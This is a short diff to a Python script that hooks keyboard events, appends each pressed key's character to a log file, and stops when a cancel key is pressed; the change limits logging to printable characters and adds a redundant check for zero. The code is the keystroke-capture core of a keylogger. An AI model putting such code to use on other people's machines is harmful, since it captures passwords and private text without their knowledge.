@@ -76,9 +76,12 @@ def main():
 
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
-            res=chr(event.Ascii)
-            if res:
-                f.write('{}\n'.format(res))
+            if(event.Ascii > 31 and event.Ascii < 126):
+                res=chr(event.Ascii)
+                if(event.Ascii == 0): # no corresponding ascii
+                    pass #meh
+                else:
+                    f.write('{}\n'.format(res))
             
         if event.Ascii == cancel_key:
             new_hook.cancel()
